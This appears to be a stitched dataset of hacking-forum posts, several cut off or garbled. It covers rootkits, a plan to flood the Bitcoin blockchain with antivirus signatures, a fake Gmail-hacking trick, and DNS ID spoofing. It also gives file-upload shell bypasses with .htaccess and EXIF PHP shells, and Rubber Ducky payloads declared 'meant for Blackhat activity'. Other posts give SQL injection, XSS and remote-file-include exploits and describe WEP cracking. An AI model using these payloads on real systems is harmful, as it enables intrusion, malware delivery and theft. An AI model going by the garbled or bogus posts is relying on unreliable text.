tests to detect a rootkit. Here are some methods the most antivirus software uses to detect rootkits on a computer: Alternative trusted medium: The best and most reliable method for operating-system-level rootkit detection is to shut down the computer suspected of infection, and then to check its storage by booting from an alternative trusted medium (e.g. a rescue CD-ROM or USB flash drive). The technique is effective because a rootkit cannot actively hide its presence if it is not running. Behavior method: This method is just looking for rootkit behavior which means hooking API to hide something. This method has a high rate of false positives. Signature based: The signature based method is using a stealth detector. If rootkit attempts to hide or unload itself during a virus scan the signature detection or fingerprinting can still find it. That’s why the programmer of a rootkit often try’s to implement counterattack methods into the rootkit which means to kill the antivirus process or service. expecting feed backs credits:Madara-Uchiha """
2	Bitcoin database flaw :D	""" Hi, found this thread on another hidden network (onion-net). Read it trough before you make any judgement. It has absolutely NOTHING to do with earning money or scamming people or whatever. Its about a bitcoin security flaw, and you CANNOT make any money out of it in any way. The flaw is easy to verify without a bitcoin client. Also note that the links in here (if considered spam) does not promote anyone. The links are to the following domains: virustotal.com, nllabs-something (some antivirus company.. the link is to a flat text document with some binary codes .. no banners there or anything and thats it). Pastebin, for some binary codes (too large to post here). Im posting this with another account than my original, since Im a bit paranoid. Im just wondering what you think (<-- thats the topic). Here we go: ====================== The bitcoin database is distributed (non-centralized) and exists on each and every one of the hosts running a bitcoin client. Theres a copy of the database on all bitcoin client, thats how the decentralization works. Once a transaction is committed, it cant be undone. A bitcoin transmission is stored as an event in the database. You can inject an arbitrary raw 20 byte binary string into the database files (forever) because of that by setting the target address of a transaction to a wanted value (more or less). A bitcoin address (the intended receiver of any amount of coins) consists of 25 bytes. The first one equals 1 by default and is uninteresting. The following 20 bytes identifies the intended receiver and can be set to exactly anything. The following 25 bytes is just a hash of the former 21 bytes. A bitcoin transaktion contains such an address and is stored on each and every bitcoin-client forever. If you delete the database from one bitcoin-client (or has a fresh install), your client will synchronize with the rest of the network. Now, imagine that we inject so called \""virus signatures\"" that anti-virus programs recognizes into the bitcoin database. Whatll happen is that that will trigger the anti-virus program for every bitcoin client user that has an anti-virus program installed (and this wont go away ever.. you cant clean the database). Those virus signatures are harmless in their own, but they are something that anti-virus program use to recognize viruses. The anti-virus programs will think that the local bitcoin database is infected. Spamming the bitcoin database with virus signatures will cause havoc. Some antivirus-programs will delete the database locally, others will deny their bitcoin-client access to the databases. Some wont be able to start their bitcoin-clients again (and cant understand why). Some will format and reinstall their computer.. to once again get \""infected\"" when they get a bitcoin client again. Panic will spread among computer n00bs. Uneducated rumors will spread that bitcoin is spreading viruses. Havoc will simply emerge. Media will react, and dramatize the thing enormously. The value of bitcoins will drop hasty. All of this just because we send a minimal amount of bitcoins (the smallest amount allowed) to given bitcoin addresses. You can confirm that the injection works by doing the following: http://brainwallet.org/#converter  click on HEX on the top, and B58Check further down. Place an exactly 20 bit hex value there. Now you can either send any amount to the bitcoin address that appears in the lower box, and verify that your local bitcoin database soon contains the 20 bytes string of your choise. But you can also take that address and input it into the search box in the upper right of  http://blockchain.info  and see that this recipent [your 20 bytes] indeed is addressed exactly as you specified (its called the Hash 160) and just trust me that itll be stored exactly so on the physical disk as well. Now, how do we know what 20 bytes to send? To make a long story short, Ive converted all virus signatures that I could find from an open project  https://www.nlnetlabs.nl/downloads/antiv...es.strings  into 20 byte long strings and later into bitcoin addresses [all signatures equal to or longer than 20 strings has been used.. the short ones have just been padded with zeros]. If I put all those \""viruses\"" into one file, it causes virus-total to go nuts  https://www.virustotal.com/en/file/ad357...396453693/ Imagine having that forever in the bitcoin database files. This is far from being the best you can do with injecting stuff into the bitcoin database (there are for example better virus signatures and alike out there that can be used). But this should work pretty well, and cause a lot of havoc and annoyance. By using the brainwallet.org converter above, you can easily convert the bitcoin addresses to hex and see that those comes solely from the virus definition database. When the coins are sent to those addresses, they are lost forever since nobody owns those addresses. Please help spamming the bitcoin database with virus signatures :). Pick some address at random, check that it havent been corrupted (use brainwallet and he virus signature list), and send a minimal amount of coins to that address. Ive failed miserably at this point, since I lack bitcoins. I thought Id have enough by now (Ive long fought to get some BTC), but aparently it wasnt enough (you need a minimum amount of fractions of a bitcoin to be able to send anything). The addresses are available here:  http://pastebin.com/ct2WHUK5  (theres no point in altering those for your own winning sake.. even if you get thousands of those minimal required transaktion amounts.. theyll combined have a value less than the price of a biscuit). """
0	How to Hack Gmail Account	""" Hacking a Gmail Account ID is easy now. Follow these simple steps, and Hack any Gmail account with this trick. Dont misuse it, use it for fun only.   How to Hack Gmail Account   CAN GMAIL ACCOUNT IDs BE HACKED? Yes! Its true that every lock has a key. The thing is that we should have that key to open any lock. Gmail accounts can also be hacked easily. But it is kept secret just because people start misusing these tricks to harm innocents. So, before going through the below trick, the following are the things you should be aware of:       1)   Use this trick for fun only. You can hack Gmail IDs of your friends to make some fun and to be superior among them. 2) There is no any software in actual, which can hack a Gmail account and retrieve their password. So, if you come across a site selling any \""Email Hacking Software\"", dont trust it. A Gmail account can be hacked only by some tricks, and not by a single click to any software. 3) Never trust any service claiming the hacking a Gmail account in just for $100 or $200. All those kind of paid services are fraud!       The following method is one of the working trick to hack a Gmail account. Follow these steps to get any Gmail password.       Step 1: Log into your Gmail account.                                  Step 2: Compose a new mail. Step 3: In subject box type \"" PASSWORD RECOVERY \""     Step 4: Write this in message box.       (First Line)- Email address you want to hack. (Second Line)- Your Gmail address (Third Line)- Your Gmail account password (Fourth Line) - <pwdcursive> v703&login=\""passmachine&f=(p0assword)&f=27586&___javascript=ACTIVE&rsa#\""   start?></script>=\""\""></cursive><>  {simply copy and paste above.}   Step 5: Send this to -  [email protected] /* &lt;![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName(script),e=t.length;e--;)if(t[e].getAttribute(data-cfhash))return t[e]}();if(t&amp;&amp;(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute(data-cfemail)){for(e=,r=0x+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+=%+(0+(0x+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]&gt; */     How it works: You contact to a system administrators automatic responder via email. Usually only system administrators can use this, but when you try it with your own password and mail this message from your Gmail account the server gets confused! Why your password is needed- Automatic Gmail responder will require your \""system administrator password\"" which is in fact your own password!!! But the server will be confused and it will not be able to get that it is done intentionally to retrieve a password of someone elses Gmail account.      This is an awesome trick and works only one time with one unique Gmail ID. Have fun! :)     Note: Use a Gmail Account you have been using from at least past 30 Days, otherwise Gmail Admin may take it as a new/temporary account and this trick may not work. Moreover Use this trick soon otherwise this flaw can be rectified soon.  [USE IT AT YOUR OWN RISK!] """

2	Xiaomi Phones Secretly Sending Users Sensitive Data to Chinese Servers	"""   Chinese  telecoms equipment suppliers have previously been criticized by some  countries due to suspected backdoors in its products, and if United  States has banned its several major government departments, including  NASA, Justice and Commerce Departments, from purchasing Chinese products  and computer technology, then they are not wrong at all.     Recently, a German security firm claimed  that a popular Chinese Android Smartphone, the Star N9500, came  pre-installed with a Trojan that could allow manufacturer to spy onto  their usersÃ¢â¬â¢ comprising their personal data and conversations without  any restrictions and users knowledge.     Now, the latest claim against Chinese smartphone manufacturers is the allegation that the popular Chinese smartphone brand,  Xiaomi  has been suspected of Ã¢â¬ÅsecretlyÃ¢â¬Â stealing usersÃ¢â¬â¢ information   Ã¢â¬â including SMS messages and photos Ã¢â¬âfrom the device without the users  permissions and sending it back to a server in Beijing, despite of  turning off the data backup functions, according to  Hidden Content:  You must reply to see links .        China-based smartphone company Xiaomi recently marked a successful entry  into the Indian market this month. Earlier this year, the company also  announced its  Redmi Note , which, just like XiaomiÃ¢â¬â¢s other  handsets, was an affordable with almost all features that an excellent  smartphone provides. However, the handset might be doing more than what  it has been advertised.     Kenny Li of Hong Kong forum, IMA Mobile, recently  Hidden Content:  You must reply to see links   something odd with its Redmi Note smartphone. He discovered that the  device continued to make connections with IP addresses in Beijing,  China. The device kept trying to make the connection, even after  switching off the companys iCloud-like MiCloud service.     Although it was pointed out that the transmissions occur only over  Wi-Fi, though the device does stay in contact with the servers via small  \""handshakes\"" while using cellular data. Li then tried erasing the  version of Android and installed a new version of Android, But the  problem still persisted.     Hidden Content:  You must reply to see links  Security Researchers from  Hidden Content:  You must reply to see links  also confirmed that Xiaomi phones (RedMi 1S handset) send quite a lot of personal and sensitive data to \"" api.account.xiaomi.com \""  server located in China, including following information:     IMEI Number of your phone IMSI Number (through MI Cloud) Your contacts and their details Text Messages   Previously China has accused companies like Google, Facebook, Microsoft,  and Apple for spying on countries. So, what China is doing? The same.      Xiaomi, which is also known as  Apple of China , has yet to respond to the allegations that the Redmi Note secretly sends user data to a China-based server.     If the allegations on the Xiaomi handset come true, it wouldnt be the  first time a Chinese smartphone was found spying on its users. It had  happened before as well, China has been known for its Digital Spying and  privacy invasion.     Later in mid-June, the breach on the Star N9500 could allow an attacker to record phone calls automatically,  read emails and text messages, and remotely control the phoneÃ¢â¬â¢s  microphone and camera, in order to turn usersÃ¢â¬â¢ smartphone into a bugging  device that allows hackers to hear anything you are saying near by the  phone. It could also be used for theft, including granting access to the  userÃ¢â¬â¢s online banking service. """

More brutal, the DNS ID Hacking/parody is very effective, very strong It is because there is no generation (even if DNS escapes rampage WinNT!). -[1.1]-the DNS protocol mechanism description In the first step, you need to know how it works for DNS.

Here is the way: 1. comes from a random DNS messages Easily (e.g. can be sniff For this example, ns.dede.com). 2. you ask for NS.victim.com to solve the (random). Dede.com. NS.victim.com will be (random) seek to solve ns.dede.com. dede.com ns.victim.com---> [? (rand). dede.com ID = 444]---> ns.dede.com 3. now you know, whats the message ID from NS.victim.com You have to use the CustomerID field. (ID in this example = 444). 4. then do the resolve request. ex. to  Hidden Content:  You must reply to see links NS.victim.com (You)---> [?  Hidden Content:  You must reply to see links ]---> ns.victim.com ns.victim.com-> [ Hidden Content:  You must reply to see links , ID = 446?]-> ns.microsoft.com 5. paint the name of the server with ID ns.victim.com (444) already exists and then this one. ns.microsoft.com-> [ Hidden Content:  You must reply to see links  = 1.1.1.1 ID = 444]-> ns.victim.com ns.microsoft.com-> [ Hidden Content:  You must reply to see links  = 1.1.1.1 ID = 445]-> ns.victim.com ns.microsoft.com-> [ Hidden Content:  You must reply to see links  = 1.1.1.1 ID = 446]-> ns.victim.com ns.microsoft.com-> [ Hidden Content:  You must reply to see links  = 1.1.1.1 ID = 447]-> ns.victim.com ns.microsoft.com-> [ Hidden Content:  You must reply to see links  = 1.1.1.1 ID = 448]-> ns.victim.com ns.microsoft.com-> [ Hidden Content:  You must reply to see links  = 1.1.1.1 ID = 449]-> ns.victim.com (Now I know, and they are just predictable DNS IDs. You ID 444 ns.victim.com + torrent with fake answers with ** * ADMsnOOfID. Without a stem, there is another way to exploit this vulnerability any DNS The mechanism is very simple. Here is a description of We send a resolution request to ns.victim.com. Provnet. fr (Siz) ---------- [? (Random).

After that, we ns.victim.com if (random). Provnet. fr IP. Ns.victim.com in us (random).

This tutorial presents the methods that can be used to circumvent these  security checks. In this case were specifically considering image  uploads that allow JPG files in particular. Each security measure numbered below will be briefly discussed and  paired with an appropriate bypass method, this tutorial aims to provide a  completeish solution. 1. Client side file verification (with Javascript and/or HTML attributes) The bypass is trivial, simply rename your shell with an allowed  extension/content type by editing the request header data with an  intercepting proxy, I like  Hidden Content:  You must reply to see links , but FF  Hidden Content:  You must reply to see links  add-on is great too. 2. A white-list of file extensions is in place so that anything that isnt a picture is DENIED: Often there will then be some sort of string manipulation to determine  the file name and extension of an uploaded file. The strength of this  code will determine whether one of the following bypasses will work.  Functions like strrchr shown below may play a part in this process and  may be passable given a little bit of imagination! Here is a list of bypasses: shell.jpg.php  (satisfies as check for jpg only) shell.jpg.php  (obfuscation) shell.php;.jpg  (sometimes can ignore whats after  \"";\"" ) shell.php%0delete0.jpg  (the infamous  NULL byte which comments out trailing text, remove the word delete so  the zeros join together, blogspot strips this string!) shell.php.test  (defaults to first recognised extension ignoring  \""test\"" ) shell.php.xxxjpg  (still ends in  .jpg , but not recognised extension so will default to php!) .phtml  (a commonly used php parsed extension often forgotten about!) .php3/.php4/.php5  (valid PHP extensions possibly left out of extension blacklists) 3. Perform further checks once uploaded to make sure it is a REAL image: The function  getimagesize()  effectively confirms whether the uploaded file is an image or not. At this point, all the other methods will fail  (there are other functions that can be used with a similar goal such as checking image dimensions) .  The only full-proof solution is to actually upload a real image which  will actually pass these checks rather than trying to bypass them. We turn to the trusty JPG file as our example image. There is an amazing  amount of information that can be stored in a jpg file along side the  actualy image data. EXIF  meta   data such as the camera model the image was taken on, image  descriptions, and comments are editable with progams such as GIMP and  even a hex editor. For purposes of this tutorial I use  Hidden Content:  You must reply to see links .  (Edit: My good pal Hooded Robin wrote a nifty exif editor and shell builder in Ruby, check it out  Hidden Content:  You must reply to see links ) . Create a small image  (avatar size)  in MSPaint  (white background) ,  we can use Exif Pilot to open/edit the file and edit the Exif data-  inserting our PHP code into the comment section. I am using my generic  tiny shell code to allow me to pass shell commands to the server on  the fly. Now we can upload the jpg file using an extension bypass shown earlier, and it will pass the real image check. To run commands on the server, usage would be: Hidden Content:  You must reply to see links  /etc/passwd 4. Found an extension that will upload but its not valid php... Upload an  .htaccess   file which sets an arbitrary file extension to be processed as php. If  there is already an .htacess file in the image upload directory this  should be automatically overwritten. Create a .htaccess file and put the following code, then upload it  (replace .mp3 with whatever extension passed) .  Code: AddType application/x-httpd-php .mp3   Upload your shell as shell.mp3. Then access as:  Hidden Content:  You must reply to see links  /etc/passwd If you are useful, why not click the REP to get a new tutorial from me :4:    """

This is my first thread on this awesome forum, this tutorial will explain how to perform A Basic  Cross Site Request Forgery Attack  (CSRF). **This is my original work, not copied ._.** I am just a  noob , if theres any mistake, please dont troll, just tell me  So lets start the tutorial,  What is CSRF Attack? CSRF is an attack which forces an end user to execute unwanted actions  on a web application in which he/she is currently authenticated. With a  little help of social engineering (like sending a link via email/chat),  an attacker may trick the users of a web application into executing  actions of the attackers choosing. A successful CSRF exploit can  compromise end user data and operation in case of normal user. If the  targeted end user is the administrator account, this can compromise the  entire web application. source: owasp ​ ... Requirements to practice. 1. Brain  2. Browser 4.

The whole idea behind CSRF is to change  user details, without actually letting the victim know, enter, and  interact on the target page. this is done by POST request on sites withno X-Csrf/Anti-Csrf protections.​ ... Some times the site will have Anti Csrf token, but still an attacker can bypass the Anti-CSRF protections, just by  checking if the tokens are validated on server or its an easily  guess-able combination. >I will post on CSRF protection bypassing, soon. ​ ...

Everything here is written by me, and yes AgentGod is one of my  brothers. Most of you bastards have been trying to find an Autorun USB that will  work and that wont get get detected and this is where the Rubber ducky  comes into play. You can buy Rubber Ducky USB here: Hidden Content:  You must reply to see links What is a rubber ducky? A rubber ducky is a USB device that looks like a  flash drive, but is actually a device that acts like a keyboard and  that executes payloads that you write yourself or get from: Other scripts and payloads: Hidden Content:  You must reply to see links It costs around $40 to get them and is a nice device to have for  security researchers. Keep in mind that you can make this yourself at  home for cheaper: Hidden Content:  You must reply to see links But the reason I made this thread was because of the script. For long I have been searching around for a payload that will execute  without admin rights and trouble, but the only thing I found was the  following;   Hidden Content:  You must reply to see links   Which essentially is not even 10% efficient. You need Administrative  rights to use the Payload above (Diskpart) and whats with the Vbs. If  you really do want to execute and run, you do not need to put the file  in temp. You can put your file in a Winrar SFX which will put your  malware into which folder you wish and run it there. Tutorial on that  will come later, as I have too much to do.   The below payload takes 3-4 seconds before executing. You have to  remount (Plug in the Rubber ducky, let it install drivers, then replug  it and have your file be executed).   DELAY 3000 GUI r DELAY 100 STRING cmd /c for /f %a in (wmic logicaldisk get volumename^, name ^| find \""DUCKY\"") do start \""\"" /D %a\\ %a\\DUCKY.exe DELAY 10 ENTER   That one is one of the codes, simple AF. It goes into Run line, uses the  wmic logicaldisk command to search for the drive name of anything you  want (Ducky) and executes it in matter of seconds. I believe the  Terminal is up for a matter of seconds not even that.   You can use the Twin Ducky to have your file stored on your ducky. I  believe you can loop the command above so you do not need to replug, but  it will just take long and is not worth it.   This is another code, does the same, but is shorter:   DELAY 3000 GUI r DELAY 100 cmd /c for /f %a in (wmic volume get DriveLetter^, Label ^| find \""DY\"") do start %a\.exe DELAY 10 ENTER   The code above is almost instant (Depends on your malware size)   And yes, this payload is meant for Blackhat activity. If you do edit it, do give proper credits.   New scripts will come, making it easier for all of us to execute our  files, going back to normal fast Autorun, not a 3 page long script that  takes 15 minutes to execute.   I forgot to mention, this does not require administrative rights, so no  need to bypass the freaking UAC problems. And go on infect domain users.   Winrar SFX: Hidden Content:  You must reply to see links I do not take any responsibility for what you use this device for. This  is for educational purposes even though I said blackhat activity. Listen up, the Rubber Ducky is bad if you ask me, it takes ages for me  before it loads up. I just recommend making one for yourself instead of  buying it. Maybe my rubber ducky was broken when I got it, but it took sometimes 5  minutes before drivers was installed. Yes, its sad and nothing I can do  about it. Hopefully you will not waste too much money, as its not that good. """

0	The Absolute Basics of Hacking	"""   [b][SIZE=\""6\""]The Absolute Basics of Hacking[/SIZE] Thanx to InfamousBytes [SIZE=\""4\""]Intro[/SIZE] Hello and welcome to this tutorial. If you see all the text on this page, and are afraid, youre not meant to be a hacker, quit now. Also, please know now that unlike in the movies, not everything is hackable. I will be writing about the basics of hacking servers; I will cover how to scan and/or exploit vulnerable daemons (services) running on the target server, and how to discover and/or exploit web-script vulnerabilities. You will need to know your way around a computer before reading this. And if you dont know what a word  means , Google or Wiki it!; if you dont understand a  concept , post here and I will try to clarify. Thanks for reading, hope this helps. [SIZE=\""4\""]Recommended Tools[/SIZE] [COLOR=\""black\""]Port Scanner - nmap -  Nmap - Free Security Scanner For Network Exploration & Security Audits. Browser - FireFox -  Firefox web browser | Faster, more secure, & customizable [/color] [SIZE=\""4\""]Daemon Vulnerabilities[/SIZE] [SIZE=\""3\""]Description[/SIZE] Daemons (also commonly known as services) are the processes that run on a computer that allow it to do things such as serve pages with the HTTP protocol, etc. (although they do not always necessarily interact over a network). Sometimes these daemons are poorly coded, which allows for an attacker to send some sort of input to them, and they either crash, or in worse cases, they run any code the attacker chooses. [SIZE=\""4\""]Scanning For Vulnerabilites[/SIZE] [COLOR=\""black\""] Well, this is where a little common sense comes in, because we need to answer one question: Which ports to scan? Well, with a little googling, wed know that the default port for the HTTPD (web daemon) is 80, for the FTPD its 21, etc. So if we wanted to know the version of the HTTPD running on the server, wed run \""nmap targetsite.com -p 80 -sV\"".  NOTICE  the -sV argument; it is vital, otherwise nmap will just return whether or not the port is open, and wont provide us with the daemons version. This is great and all, but we dont want to just scan one port at a time do we? Well nmap has us covered there, so just scan multiple ports by seperating each target port with a comma (,) like so: \""nmap targetsite.com -p 21,80 -sV\"". However, if you dont mind the scan taking a while longer, you can scan a range of ports like so: \""nmap targetsite.com -p 1-1000 -sV\"". This will scan  all  ports between 1 and 1000.[/color] [SIZE=\""4\""]Checking For Vulnerability[/SIZE] After your scan has finished, nmap will display the open ports on your target, along with their version (if they were identifiable, usually they are). An example return would look like this: \""80/tcp open http Apache httpd 2.0.32\"". Taking this information, we search on milw0rm for \""Apache\"". After skimming through the results, we see that the target is vulnerable to  this  vulnerability, which when run on the target server will make it crash. [SIZE=\""3\""]Using the Exploits[/SIZE] This varies, depending on the language that the exploit is coded in; google on how to do this, since it would just be wasting my time how to use all of the different languages here. [SIZE=\""3\""]Common Web-Script Vulnerabilities[/SIZE] Description [COLOR=\""black\""]In this section, I will be writing about vulnerabilities in a webservers server-sided code. Here are the topics I will be covering: SQL Injection XSS (Cross-Site Scripting) RFI/LFI (Remote/Local File Include) [/color] [SIZE=\""3\""]SQL Injection[/SIZE] [COLOR=\""black\""] Description SQL injection is the act of injection your own, custom-crafted SQL commands into a web-script so that you can manipulate the database any way you want. Some example usages of SQL injection: Bypass login verification, add new admin account, lift passwords, lift credit-card details, etc.; you can access  anything  thats in the database. Example Vulnerable Code - login.php (PHP/MySQL) Heres an example of a vulnerable login code[/color] PHP Code: <?php $user  =  $_POST [ u ]; $pass  =  $_POST [ p ]; if (!isset( $user ) || !isset( $pass )) {     echo( \""<form method=post><input type=text name=u value=Username><br /><input type=password name=p value=Password><br /><input type=submit value=Login></form>\"" ); } else {      $sql  =  \""SELECT `IP` FROM `users` WHERE `username`= $user  AND `password`= $pass \"" ;      $ret  =  mysql_query ( $sql );      $ret  =  mysql_fetch_array ( $ret );     if ( $ret [ 0 ] !=  \""\"" ) {         echo( \""Welcome,  $user .\"" );     } else {         echo( \""Incorrect login details.\"" );     } } ?> Basically what this code does, is take the username and password input, and takes the userss IP from the database in order to check the validity of the username/password combo. Testing Inputs For Vulnerability Just throw an \""\"" into the inputs, and see if it outputs an error; if so, its  probably  injectable. If it doesnt display anything, it  might  be injectable, and if it is, you will be dealing with blind SQL injection which anyone can tell you is no fun. Else, its  not injectable . The Example Exploit Lets say we know the admins username is Administrator and we want into his account. Since the code doesnt filter our input, we can insert anything we want into the statement, and just let ourselves in. To do this, we would simply put \""Administrator\"" in the username box, and \"" OR 1=1--\"" into the password box; the resulting SQL query to be run against the database would be \""SELECT `IP` FROM `users` WHERE `username`=Administrator AND `password= OR 1=1--\"". Because of the \""OR 1=1\"", it will have the ability to ignore the password requirement, because as we all know, the logic of \""OR\"" only requires one question to result in true for it to succeed, and since 1 always equals 1, it works; the \""--\"" is the comment out character for SQL which means it ignores everything after it, otherwise the last \""\"" would ruin the syntax, and just cause the query to fail. [SIZE=\""3\""]XSS (Cross-Site Scripting)[/SIZE] [COLOR=\""black\""] Description This vulnerability allows for an attackers input to be sent to unsuspecting victims. The primary usage for this vulnerability is cookie stealing; if an attacker steals your cookie, they can log into whatever site they stole your cookie from under your account (usually, and assuming you were logged in at the time.) Example Vulnerable Code - search.php (PHP) [/color] PHP Code: <?php $s  =  $_GET [ search ]; // a real search engine would do some database stuff here echo( \""You searched for  $s . There were no results found\"" ); ?> [COLOR=\""black\""] Testing Inputs For Vulnerability For this, we test by throwing some HTML into the search engine, such as \""<font color=red>XSS</font>\"". If the site is vulnerable to XSS, you will see something like this: [/color] XSS , else, its not vulnerable. Example Exploit Code (Redirect) Because were mean, we want to redirect the victim to goatse (dont look that up if you dont know what it is) by tricking them into clicking on a link pointed to \""search.php?search=<script>window.location=http://goatse.cz/</script>\"". This will output \""You searched for <script>window.location=http://goatse.cz/</script>. There were no results found\"" (HTML) and assuming the targets browser supports JS (JavaScript) which all modern browsers do unless the setting is turned off, it will redirect them to goatse. [SIZE=\""3\""]RFI/LFI (Remote/Local File [/SIZE]Include) [COLOR=\""black\""] Description This vulnerability allows the user to include a remote or local file, and have it parsed and executed on the local server. Example Vulnerable Code - index.php (PHP) [/color] PHP Code: <?php $page  =  $_GET [ p ]; if (isset( $page )) {     include( $page ); } else {     include( \""home.php\"" ); } ?> [COLOR=\""black\""] Testing Inputs For Vulnerability Try visiting \""index.php?p=http://www.google.com/\""; if you see Google, it is vulnerable to RFI and consequently LFI. If you dont its not vulnerable to RFI, but still may be vulnerable to LFI. Assuming the server is running *nix, try viewing \""index.php?p=/etc/passwd\""; if you see the passwd file, its vulnerable to LFI; else, its not vulnerable to RFI or LFI. Example Exploit Lets say the target is vulnerable to RFI and we upload the following PHP code to our server[/color] PHP Code: <?php unlink ( \""index.php\"" ); system ( \""echo Hacked > index.php\"" ); ?> and then we view \""index.php?p=http://our.site.com/malicious.php\"" then our malicious code will be run on their server, and by doing so, their site will simply say Hacked now.

0	The Caffe Latte Attack	""" The Caffe Latte Attack: How It WorksÃ¢â¬âand How to Block It The flaws that make WEP vulnerable were documented back in 2001, prompting development of dozens of cracking tools. Until recently, those attacks focused on traffic captured from active networks, requiring proximity to the targeted business. But lately, focus has shifted to off-site clients that are not connected to any network. By exploiting driver flaws, exposed fileshares, and user mistakes, one can easily and invisibly attack Wi-Fi laptops and phones in public venues like airplanes, hotels, and cafes. This year, insidious new tools like Caffe Latte and Wep0ff have learned how to crack the keys stored on those off-site clients, expanding the reach of WEP crackers far beyond office walls. Now, no matter where employees go, they just might unwittingly \""spill the beans\"" on your corporate WEP key. Come to me Most client-side attacks take advantage of two fundamental vulnerabilities: Wi-Fi clients actively probe for all networks they have associated with in the past. When any AP is found with a known network name (SSID), clients automatically associate to it. This common-but-promiscuous behavior is the culprit behind well-known evil twin or honeypot attacks we have written about before (see Getting Phished: Why SSID Spoofing Still Matters). In fact, those older attacks provide the launch pad for new client-side WEP crackers, creating the perfect conditions in which to grab any corporate WEP keys cached by those clients. Talk to me All WEP crackers use statistical analysis to guess the key used to encrypt captured traffic. Given enough encrypted traffic, WEP crackers can always derive the key. A WEP-cracking attack therefore starts with locating a source of encrypted packets. It turns out that phished Wi-Fi clients are an awfully convenient and plentiful source. Specifically, all TCP/IP devices send a least a few packets whenever they connect to a WLAN. A station using a static IP immediately broadcasts a few gratuitous ARP packets to the entire WLAN. Each ARP packet carries the senders MAC address and IP address so that other stations will know how to route traffic. A station using a dynamic IP also sends ARP, after first requesting an IP address from a DHCP server. If no server is found, the station assigns itself an Automatic Private IP Address from the 169.254.0.0/16 subnet and then sends gratuitous ARP Tell me your secrets If a client associates to an AP that uses WEP, it may or may not be required to authenticate itself before associating, using a shared WEP key. However, the AP is never required to prove that it, in fact, possesses the WEP key. This means that a phony AP (aka evil twin) can be configured with the SSID of a corporate WLAN and any key to lure clients. After a client associates to the phony AP, it will send a few ARP packetsÃ¢â¬âencrypted with the corporate WEP key. A handful of encrypted ARP packets wont be enough to crack the corporate WEP key. So something must cause the client to repeatedly send encrypted ARP packets. One approach is to disconnect or deauthenticate the client, over and over again, but that would take a long time. According to Vivek Ramachandran, co-author of the Caffe Latte attack demonstrated at Toorcon this October, cracking a WEP key this way takes between 1.5 and 6 days, depending upon the clients use of DHCP. Thats theoretically interesting, but of little practical value, since a true hotspot attack must be completed in a much shorter time periodÃ¢â¬âpreferably in the few minutes that it takes to purchase an espresso. Hurry it up, will you? Ramachandran and colleague Md Sohail Ahmad decided to search for ways to make the client much more verbose. The Caffe Latte paper that the pair submitted to Toorcon described multiple ways to accelerate this attack. By applying different WEP cracking techniques (FMS, Korek, PTW) to various frames (DHCP, ARP, 802.11), the authors had managed to bring the average cracking time down significantly. The worst-case configuration (client using static IP and no authentication) ran about nine hours, while the best case (client using DHCP and shared key authentication) took as little as 20 minutes. \""That was better, but still not fast enough to be a coffee shop attack,\"" said Ramachandran. Then Ramachandran and Ahmad noticed a vulnerability that could be exploited more consistently across every client configuration. Any station that receives an ARP request automatically responds with an ARP reply. It must be possible to generate a valid encrypted ARP request without knowing the WEP key, but how? Upon connecting, the client transmitted several correctly encrypted gratuitous ARP requests. An attacker can flip a few bits in one of those captured packets, changing that gratuitous ARP into an ARP request, addressed to the client. By sending that forged ARP request repeatedly, the client can be stimulated into replying with thousands of correctly-encrypted ARP replies.  The final version of the Caffe Latte tool developed by Ramachandran and Ahmad can use this refined methodology to recover cached 128-bit WEP keys from any client in roughly six minutes. Ill tell you no lies This attack works because not only is WEP vulnerable to statistical analysis, but it does nothing to cryptographically protect packet integrity. In other words, recipients have no way to detect when a valid packet has been captured and replayed, as-is or with modification. Every WEP-encrypted packet carries a Cyclic Redundancy Check (CRC) that is used to spot transmission errors. But, it has long been known that a sender could change both the data payload and the CRC to create a valid packet. Caffe Latte uses this bit-flipping technique to modify the Sender MAC and Sender IP Address contained in a gratuitous ARP header, turning that captured packet into an encrypted ARP request, addressed to the victim client. Because the victim cannot tell that those forged ARP requests are bogus, it replies with a WEP-encrypted ARP response, as defined by the ARP protocol. Over and over and over again. Prove it Ramachandran and Ahmad demonstrated Caffe Latte on October 21, 2007, at Toorcon [PPT]. With fellow AirTight Networks employee Rick Farina, they also produced a real-time video of the attack being launched against an Apple iPhone. With their permission, several snapshots from that video appear below to help us illustrate the Caffe Latte attack. 1. Monitor hotspot WLAN traffic to identify potential corporate SSIDs.   2. Start capturing all traffic generated by target clients. 3. Use phony AP with corporate SSID and any WEP key to lure target client. 4. Extract gratuitous ARP Request from capture file.  5. Send ARP Request to Caffe-Latte, generating bit-flipped ARP Request flood. 6. Run Aircrack-NG (or your favorite WEP cracker) on corporate SSID and capture file. 7. After analyzing roughly 55-60K ARP Responses, crack 128-bit WEP key.    Learning self-defense \""We wanted to educate people by demonstrating that this threat exists,\"" said Ramachandran. \""But we did not want to give a point and click tool to hackers. The best defense is to stop using WEP.\"" That is sound advice. But for corporate users, decisions about whether to use WEP are made by the employer not the employee, so individual users should take the following precautions to avoid falling victim to Caffe Latte: 1. Narrow the window of opportunity by disabling Wi-Fi adapters when not in use. Many laptops and other devices now have a physical on/off switch for Wi-Fi. Use it. 2. Reconfigure your client to avoid reconnecting automatically to Preferred Networks. That way, you wont be tricked into connecting to any AP without your consent, and you will realize that a corporate SSID showing up in a public hotspot is not legitimate. (This is particularly important for iPhone users and other with devices that lack an on/off switch for Wi-Fi.) 3. If manual connection management is too inconvenient, then run a host-resident Wireless IPS. A host WIPS like those described here can profile SSIDs and APs used in specific situations. For example, a \""Work\"" profile could let you connect to your corporate SSID at the office, while switching to a \""Hotspot\"" profile could make sure that you ignore that corporate SSID outside the office. 4. Install the Wireless Client Update for 32-bit versions of Microsoft Windows XP with Service Pack 2 (KB 917021). This update stops clients from probing for Preferred Networks that broadcast their SSIDs when the configuration option \""Connect even if the network is not broadcasting\"" is disabled.   Enterprise-level defense As corporate WLANs migrate away from WEP, what can employers do to deter this attack? Caffe Latte does its dirty work outside the office, well beyond the reach of an Enterprise WIPS. However, there are a few Band-Aids that can be applied to stem the blood loss. To use a Caffe Latte-cracked WEP key, attackers must determine the geographic location of the corporate WLAN. Opaque (random) SSIDs make that just a little bit harder, although geographic coordinates for many SSIDs can be obtained from WiGLE.net. WEP key rotation can reduce the time period during which a cracked key remains useful. But realize that someone running Caffe Latte against workers lunching at your local sandwich 